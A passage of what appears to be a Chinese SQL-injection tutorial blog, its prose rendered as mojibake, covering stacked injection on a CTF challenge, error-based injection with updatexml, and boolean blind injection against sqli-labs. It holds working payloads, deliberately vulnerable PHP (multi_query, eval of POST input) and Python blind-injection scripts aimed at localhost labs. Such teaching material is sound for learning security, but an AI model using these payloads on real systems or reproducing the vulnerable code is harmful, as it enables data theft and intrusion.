éšä¾¿ç©ï¼Œå…¬ç”¨çš„è¯å°±å®¹æ˜“è¢«åˆ«äººå–·äº†ï¼Œä¸‡ä¸€ç¯å¢ƒä¸èƒ½é‡ç½®ï¼Œé‚£ä½ ä¸æ˜¯ç›´æ¥æ²¡äº†ã€‚</p><p>ç¬¬äºŒç§æ–¹å¼æ˜¯æŠŠè£… <code>flag</code> çš„è¡¨æ”¹æˆæœ¬æ¥çš„é€»è¾‘æŸ¥è¯¢çš„è¡¨ï¼Œä¹Ÿå°±æ˜¯ <code>words</code> è¡¨ã€‚æˆ‘ä»¬æŠŠé‚£ä¸ªè¡¨çš„åå­—æ”¹æˆ <code>words</code>ï¼Œç„¶åå®ƒå¯èƒ½æ˜¯æ ¹æ® <code>id</code> æŸ¥è¯¢çš„ï¼Œæˆ‘ä»¬å°±æŠŠ <code>flag</code> åˆ—æ”¹æˆ <code>id</code> ä¹Ÿè®¸å®ƒæ˜¯æ ¹æ® <code>words</code> æŸ¥è¯¢çš„ï¼Œæˆ‘ä»¬åˆ°æ—¶å€™æ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p><p>å…ˆå†™å‡ºæˆ‘ä»¬è¿™å‡ æ­¥çš„ <code>sql</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to `111`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸçš„è¯æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªä¸‡èƒ½å¯†ç å³å¯æŸ¥å‡ºæ‰€æœ‰åŸ <code>flag</code> è¡¨çš„æ‰€æœ‰è®°å½•ã€‚</p><p>æˆ‘ä»¬çš„ <code>payload</code> å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to `111`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åæˆ‘ä»¬ä½¿ç”¨ <code>1&#39; or 1=1--+</code> å¾—åˆ° <code>flag</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/24.png" alt="24"></p><p>å †å æ³¨å…¥ä¸ºä»€ä¹ˆå¯ä»¥å®ç°ï¼Œä¸‹é¢å°±åˆ°äº†æˆ‘ä»¬çš„æºç ç¯èŠ‚äº†ï¼Œæ²¡æœ‰å®˜æ–¹çš„æºç ï¼Œåªæ˜¯ä»ç½‘ä¸Šå¯»æ‰¾åˆ°äº†å·®ä¸å¤šç±»ä¼¼çš„ï¼Œå¤ç°å‡ºæ¥ä¹ŸåŸºæœ¬ä¸€è‡´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;å–æäºæŸæ¬¡çœŸå®ç¯å¢ƒæ¸—é€ï¼Œåªè¯´ä¸€å¥è¯ï¼šå¼€å‘å’Œå®‰å…¨ç¼ºä¸€ä¸å¯&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmapæ˜¯æ²¡æœ‰çµé­‚çš„ --&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    å§¿åŠ¿: &lt;input type=&quot;text&quot; name=&quot;inject&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function waf2($inject) &#123;</span><br><span class="line">    strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) &amp;&amp; die(&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;inject&#x27;])) &#123;</span><br><span class="line">    $id = $_GET[&#x27;inject&#x27;];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    //å¤šæ¡sqlè¯­å¥</span><br><span class="line">    $sql = &quot;select * from `words` where id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    if ($res)&#123;//ä½¿ç”¨multi_query()æ‰§è¡Œä¸€æ¡æˆ–å¤šæ¡sqlè¯­å¥</span><br><span class="line">      do&#123;</span><br><span class="line">        if ($rs = $mysqli-&gt;store_result())&#123;//store_result()æ–¹æ³•è·å–ç¬¬ä¸€æ¡sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span><br><span class="line">          while ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); //å…³é—­ç»“æœé›†</span><br><span class="line">          if ($mysqli-&gt;more_results())&#123;  //åˆ¤æ–­æ˜¯å¦è¿˜æœ‰æ›´å¤šç»“æœé›†</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;while($mysqli-&gt;next_result()); //next_result()æ–¹æ³•è·å–ä¸‹ä¸€ç»“æœé›†ï¼Œè¿”å›boolå€¼</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;error &quot;.$mysqli-&gt;errno.&quot; : &quot;.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  //å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸­é—´çš„æºç ç¯èŠ‚å¯ä»¥çœ‹åˆ°å®ƒåœ¨æ‰§è¡Œ <code>sql</code> è¯­å¥çš„æ—¶å€™ä½¿ç”¨äº† <code>multi_query</code> å‡½æ•°ï¼Œå¹¶ä¸”ä¼šè¾“å‡ºæ‰€æœ‰çš„ç»“æœé›†ã€‚æ‰€ä»¥è¿™é¢˜å¯ä»¥ç”¨å †å æ³¨å…¥çš„åŸå› å°±åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°è·å¾—å¤šæ¡è¯­å¥çš„å›æ˜¾ï¼Œè€Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸èƒ½çš„ï¼Œæ‰€ä»¥è¿™é¢˜å°±æ˜¯ä¸“é—¨è®©ä½ ç”¨å †å æ³¨å…¥çš„ã€‚</p><h5 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æˆ‘ä»¬ä¹Ÿæ¥å°æ€»ç»“ä¸€ä¸‹å †å æ³¨å…¥ï¼šä¼˜ç‚¹å½“ç„¶å°±æ˜¯æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°æ‰§è¡Œå¤šæ¡ <code>sql</code> è¯­å¥ï¼Œä½†æ˜¯è¦æ±‚è¦å›æ˜¾æ‰€æœ‰çš„ç»“æœé›†ï¼Œå¦åˆ™å¾ˆå¤šä¿¡æ¯éƒ½æ˜¯æš´ä¸å‡ºæ¥çš„ã€‚å¦‚æœä½ åœ¨æ™®é€šçš„é¢˜ç›®ä¸Šä½¿ç”¨å †å æ³¨å…¥ï¼Œé‚£ä¹ˆå‰é¢é‚£ä¸ª <code>select</code> å°±ç®—æ˜¯ç©ºé›†é‚£å®ƒä¹Ÿä¸ä¼šè¿”å›ç¬¬äºŒä¸ªç»“æœé›†çš„å†…å®¹ï¼Œæ‰€ä»¥è¿™ä¹Ÿæˆä¸ºäº†å †å æ³¨å…¥çš„å±€é™æ€§ã€‚</p><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><p>åˆ©ç”¨ä¸€äº›å‡½æ•°çš„ç‰¹æ€§ï¼Œé€šè¿‡å®ƒä»¬çš„æŠ¥é”™æŠŠä¿¡æ¯æ³„éœ²å‡ºæ¥ï¼Œå½“ç„¶å‰ææ˜¯ä½ å¯ä»¥çœ‹åˆ°å®ƒæŠ¥é”™ã€‚</p><p>æˆ‘ä»¬å‰é¢ä»‹ç»çš„æœ‰å…³ <code>xml</code> çš„å‡½æ•°éƒ½æ˜¯æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ª <code>updatexml</code> ã€‚è‡³äºæŠ¥é”™æ³¨å…¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘æ¥æ‰“ä¸ªæ¯”æ–¹ï¼Œæœ‰ä»¥ä¸‹ç¨‹åºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å·²çŸ¥åŒ…å«çš„æ–‡ä»¶æ˜¯ä¸€ä¸ª <code>$flag</code> å˜é‡ï¼Œæ ‡å‡†è¾“å‡ºæµå…³é—­çš„æƒ…å†µä¸‹å¦‚ä½•çŸ¥é“ <code>flag</code> çš„å€¼ï¼Ÿè¿™ä¹ˆè¯´å§ï¼Œæˆ‘ä»¬å¹³æ—¶çš„ä¸€åˆ‡æ­£å¸¸è¾“å‡ºéƒ½æ˜¯æ ‡å‡†è¾“å‡ºæµæ‰“å°å‡ºæ¥çš„ã€‚åªæœ‰æŠ¥é”™ä¿¡æ¯æ˜¯æ ‡å‡†é”™è¯¯æµæ‰“å°çš„ï¼Œå¦‚æœè¿™é‡Œå¼ºåˆ¶è®©æˆ‘åˆ©ç”¨é”™è¯¯æµè¾“å‡ºï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥é€‰æ‹© <code>rm($flag)</code>ã€‚å½“å®ƒæ‰§è¡Œçš„æ—¶å€™è¿™ä¸ªå‡½æ•°å°±ä¼šæŠ¥é”™ <code>xxx not found</code>ï¼Œè¿™ä¸ªä¼šé€šè¿‡é”™è¯¯æµæ‰“å°ï¼Œè€Œè¿™é‡Œçš„ <code>xxx</code> å°±æ˜¯ <code>$flag</code> å˜é‡çš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šè®©å…³é”®ä¿¡æ¯æ‰§è¡Œï¼Œç„¶åé€šè¿‡æŠ¥é”™ä½¿å¾—æ‰“å°è¿™ä¸ªå…³é”®çš„ä¿¡æ¯ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¯èƒ½å°±æ˜¯è®©å®ƒæ‰“å°å‡º <code>$flag not found</code>ï¼Œè¿™é‡Œçš„ <code>$flag</code> å¿…é¡»è¢«è§£ææ‰§è¡Œæˆå®ƒé‡Œé¢çš„å†…å®¹æ‰æ˜¯å¯¹æˆ‘ä»¬æœ‰ç”¨çš„ã€‚</p><p>åœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œå®ƒæ ‡å‡†è¾“å‡ºæµå¹¶ä¸èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå›æ˜¾çš„åœ°æ–¹ï¼Œæ¯”å¦‚å¸¸è§çš„ç›²æ³¨ï¼Œå®ƒæ ‡å‡†è¾“å‡ºæµåªä¼šæ‰“å° <code>You are in</code> æˆ–è€… <code>You are not in</code>ã€‚è¿™é‡Œå¦‚æœå®ƒæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥å»æ³„éœ²ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹ç¬¬ä¸€ä¸ªå‡½æ•°ï¼š<code>updatexml(xml,find,replacement)</code>å°±æ˜¯ä¸€ä¸ª  <code>xml</code> æ›¿æ¢çš„å‡½æ•°ï¼Œè¿™é‡Œä¸­é—´çš„ <code>find</code> å‚æ•°å¿…é¡»ä½¿ç”¨ <code>Xpath</code> æ ¼å¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™å¹¶ä½¿ç”¨æ ‡å‡†é”™è¯¯æµæ‰“å°ç¬¬äºŒä¸ªå‚æ•°ã€‚</p><p>æˆ‘ä»¬æ¥è¯•è¯•çœ‹ï¼šä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,user(),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/25.png" alt="25"></p><p>å¯ä»¥çœ‹åˆ°è™½ç„¶æç¤ºé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯æˆåŠŸæ‰“å°äº†æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œèƒ½æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å¾ˆå¤šï¼ŒæŠ¥é”™æ³¨å…¥ä¹Ÿä¸è¿‡å¤šæ¼”ç¤ºäº†ã€‚</p><h5 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æŠ¥é”™æ³¨å…¥åˆ©ç”¨æ¡ä»¶å’Œè”åˆæŸ¥è¯¢æ³¨å…¥å·®ä¸å¤šï¼ŒæŠ¥é”™æ³¨å…¥éœ€è¦èƒ½çœ‹åˆ°æŠ¥é”™ä¿¡æ¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯ä¸€ä¸ªå›æ˜¾çš„ç‚¹ï¼Œæœ‰ä¹‹åå°±è·Ÿè”åˆæŸ¥è¯¢æ³¨å…¥å·®ä¸å¤šäº†ï¼ŒæŠŠ <code>updatexml</code> å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ›¿æ¢æˆè‡ªå·±æƒ³çŸ¥é“çš„ä¸œè¥¿ã€‚</p><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><p>å’•å’•å’•</p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>æ— å›æ˜¾çš„æ³¨å…¥åˆç§°ä¸ºç›²æ³¨ã€‚å¦‚æœæ— å›æ˜¾æˆ–è€…å›æ˜¾çš„å†…å®¹å’Œæ•°æ®åº“çš„å†…å®¹æ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªèƒ½é‡‡ç”¨ç›²æ³¨çš„æ‰‹æ®µã€‚ç›²æ³¨æ ¹æ®åˆ©ç”¨æ‰‹æ³•çš„ä¸åŒåˆåˆ†ä¸ºä»¥ä¸‹ä¸¤ç§</p><ol><li>å¸ƒå°”ç›²æ³¨ï¼šå¦‚æœç½‘ç«™æ ¹æ®æœ‰æ— æŸ¥æ‰¾æˆåŠŸï¼Œç»™ä½ è¿”å›çš„æœ‰ä¸”ä»…æœ‰ä¸¤ä¸ªç»“æœã€‚æˆ‘ä»¬çš„åšæ³•ä¸€èˆ¬æ˜¯ï¼Œè®©å‰é¢ <code>where</code> çš„æ¡ä»¶æ’ä¸ºå‡ï¼Œå† <code>or</code> ä¸€ä¸ªè‡ªå·±è¦åˆ¤æ–­çš„è¯­å¥ã€‚æˆ–è€…è®©å‰é¢æ’ä¸ºçœŸï¼Œå† <code>and</code> ä¸€ä¸ªæˆ‘ä»¬è¦åˆ¤æ–­çš„ç»“æœï¼Œè¿™æ ·çš„è¯åˆ¤æ–­çš„å°±æ˜¯æˆ‘ä»¬æƒ³çŸ¥é“çš„ç»“æœäº†ã€‚</li><li>æ—¶é—´ç›²æ³¨ï¼šä½¿ç”¨ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œå† <code>and</code> æˆ– <code>or</code> ä¸€ä¸ª <code>sleep</code> å‡½æ•°ï¼Œæ ¹æ®æ˜¯å¦ä¼‘çœ åˆ¤æ–­æ¡ä»¶æ˜¯å¦ä¸ºçœŸã€‚</li><li>DNSlogç›²æ³¨ï¼šå½“ç›®æ ‡ä¸èƒ½æ‰“å°ä»»ä½•æ•°æ®åº“ä¿¡æ¯ï¼Œä½†æ˜¯å¯ä»¥å‘èµ·DNSè¯·æ±‚çš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹å¼ï¼Œè¿™ä¸ªè®²é“ç†ä¸èƒ½å«ç›²æ³¨äº†ï¼Œå› ä¸ºå®ƒèƒ½å›æ˜¾æ•°æ®ã€‚</li></ol><p>ç›²æ³¨çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œæˆ‘ä¸€æ¬¡æ‰“è¿‡å»æˆ‘æœ€å¤šçŸ¥é“ <code>1bit</code> çš„æ•°æ®ï¼Œæ‰€ä»¥ç›²æ³¨æ‰‹æ‰“æ˜¯éå¸¸è€—æ—¶çš„ï¼Œä¸‹é¢æˆ‘å°†æ¼”ç¤ºæ‰‹æ‰“å’Œå†™è„šæœ¬æ‰“ã€‚è™½ç„¶åœ¨æŸäº›æ—¶å€™ <code>sqlmap</code> æœ‰å¥‡æ•ˆï¼Œä½†æ˜¯ä½ å¾—æƒ³è¿‡ï¼Œå‡ºé¢˜äººä¸å¯èƒ½ä¼šå‡ºä¸€é“ <code>sqlmap</code> èƒ½ç›´æ¥è·‘å‡ºç­”æ¡ˆçš„é¢˜ç›®ï¼Œæ‰€ä»¥çœŸæå®æ–™è¿˜å¾—è‡ªå·±å­¦ä¼šã€‚</p><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>æˆ‘ä»¬æ‰“å¼€ <code>sqli-labs-lesson5</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/26.png" alt="26"></p><p>å¯ä»¥çœ‹åˆ°å®ƒè¿™é‡Œåªå›æ˜¾äº† <code>You are in</code>ï¼Œå°±å¥½æ¯”ï¼Œä½ ç™»é™†æˆåŠŸäº†ï¼Œä¸Šé¢ä¸æ˜¾ç¤ºä½ çš„ç”¨æˆ·åï¼Œåªæ˜¯å‘Šè¯‰äº†ä½ ç™»å½•æˆåŠŸï¼Œå¦åˆ™æç¤ºä½ è´¦å·æˆ–è€…å¯†ç é”™è¯¯ã€‚è™½ç„¶æŠ¥é”™æœ‰æç¤ºï¼Œä½†æ˜¯æˆ‘ä»¬ä¸ç”¨ï¼Œä¸»è¦ä½¿ç”¨ç›²æ³¨æ¥è§£å†³ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æƒ³çŸ¥é“æœ‰ä»€ä¹ˆæ•°æ®åº“ï¼Œæˆ‘ä»¬å°±è±¡å¾æ€§æ‰“ä¸€ä¸ªæ•°æ®åº“ <code>security</code> ä¸‹æ¥å§ï¼Œé€šè¿‡ç›²æ³¨çš„æ–¹å¼æŠŠè¿™ä¸ªæ•°æ®åº“åè·å–åˆ°ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ç¡®å®šä¸€ä¸‹æ•°æ®åº“åå­—å¤šé•¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length(database())&lt;5--+</span><br></pre></td></tr></table></figure><p>å°äº5å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬æ¢æˆ <code>&lt;8</code>ï¼Œå‘ç°è¿˜æ˜¯æ²¡æœ‰ï¼Œå†æ¢æˆ <code>&lt;9</code> å‘ç°æœ‰ã€‚æˆ‘ä»¬å°±çŸ¥é“äº†æ•°æ®åº“åé•¿åº¦ä¸º <code>8</code> äº†ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/27.png" alt="27"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>left</code> å‡½æ•°æˆªå–å­—ç¬¦ä¸²å‰ç¼€ï¼Œç„¶ååˆ¤æ–­ï¼Œæˆ‘ä»¬ä¸€ä½ä¸€ä½å¼€å§‹åˆ¤æ–­ã€‚æœ€åå‘ç° <code>left(database(),1)=&#39;s&#39;</code> è¿”å›æ­£ç¡®ç»“æœã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ˜¯ <code>s</code>ã€‚ç„¶åæˆ‘ä»¬åé¢å†ä¸€ç›´è¿™æ ·åˆ¤æ–­ï¼Œä¾¿èƒ½å¾ˆå¿«çŸ¥é“æ•°æ®åº“åäº†ã€‚</p><p>è¿™é‡Œä¸ºäº†æå‡è‡ªå·±ï¼Œå»ºè®®è‡ªå·±ç”¨ <code>python</code> å†™ä¸€ä¸ªè„šæœ¬æ¥è¿›è¡Œç›²æ³¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹è¿è¡Œç»“æœã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/28.png" alt="28"></p><p>ç„¶åå†™ä¸€ä¸‹è·‘æ•°æ®åº“åç§°çš„è„šæœ¬ã€‚è¿™é‡Œéœ€è¦è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨æˆªå–å­—ç¬¦çš„æ—¶å€™ä¸ºä»€ä¹ˆè¦åŠ  <code>ord</code>ï¼Œå› ä¸º <code>mysql</code> æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥ç›´æ¥å­—ç¬¦ä¸²æ¯”è¾ƒå°±å¯èƒ½å‡ºç° <code>mid(database(),1,1)&lt;&#39;T&#39;</code> ä¸º <code>true</code> ä½†æ˜¯ <code>mid(database(),1,1)&lt;&#39;s&#39;</code> ä¸º <code>false</code>ï¼Œè¿™æ˜¾ç„¶ä¸ç¬¦åˆäºŒåˆ†ç­”æ¡ˆçš„æœŸæœ›ï¼Œä¼šå¯¼è‡´ç¨‹åºæ­»æ‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and length(database())&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27;--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">0</span></span><br><span class="line">    r=<span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and ord(mid(database(),&#123;0&#125;,1))&lt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        p=get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span 